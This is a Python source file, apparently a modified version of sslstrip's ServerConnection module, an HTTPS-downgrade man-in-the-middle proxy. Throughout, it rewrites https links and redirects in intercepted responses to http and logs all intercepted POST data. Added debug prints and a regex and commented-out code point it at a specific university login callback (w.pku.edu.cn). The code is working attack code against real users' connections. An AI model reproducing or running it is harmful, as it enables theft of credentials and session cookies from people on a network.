# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor

def striper(matched):
    matched = matched.group(0)
    return "http://" + matched[8:len(matched)]


class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlFucker = re.compile(r"http://w.pku.edu.cn/users/auth/pkuauth/callback", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.log(self.getLogLevel(), "Read from server:\n" + data)

        data = self.replaceSecureLinks(data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        self.client.write(data)
        self.shutdown()

    def replaceSecureLinks(self, data):
        logging.warning("all in all, url is -> " + self.uri)
        print("all in all, url is -> " + self.uri)
        '''
        uri_end = "fuck"
        if len(self.uri) > 3:
            uri_end = self.uri[len(self.uri) - 3 : len(self.uri)]
        if uri_end == "css" or uri_end == ".js":
            print("skipped with css or js or damn files!!")
            return data
        '''
        if not "jsp" in self.uri and not "php" in self.uri and not "asp" in self.uri and not "html" in self.uri and not "do" in self.uri:
            print("skipped with css or js of damn files!!")
            return data
        print("halo we're doing this with " + data + "--------\n")
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()
            #if url == "https://w.pku.edu.cn/users/auth/pkuauth/callback":
            #    logging.warning("don't strip callback-> " + url)
            #    continue

            logging.debug("Found secure reference: " + url)
            print("Found secure reference: " + url)
            #data = data.replace(url, "http://" + url[8:len(url)])

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        #data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        #data = re.sub(ServerConnection.urlType, 'http://', data)
        #data = data.replace("https://", "http://")
        print("--------------------------------right before we sub")
        data = re.sub(ServerConnection.urlExpression, striper, data)
        print("---------------------------------left after we sub")
        #return re.sub(ServerConnection.urlFucker, 'https://w.pku.edu.cn/users/auth/pkuauth/callback', data)#revive
        print("-*---------------------------------ready to return dat striped")
        return data

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()


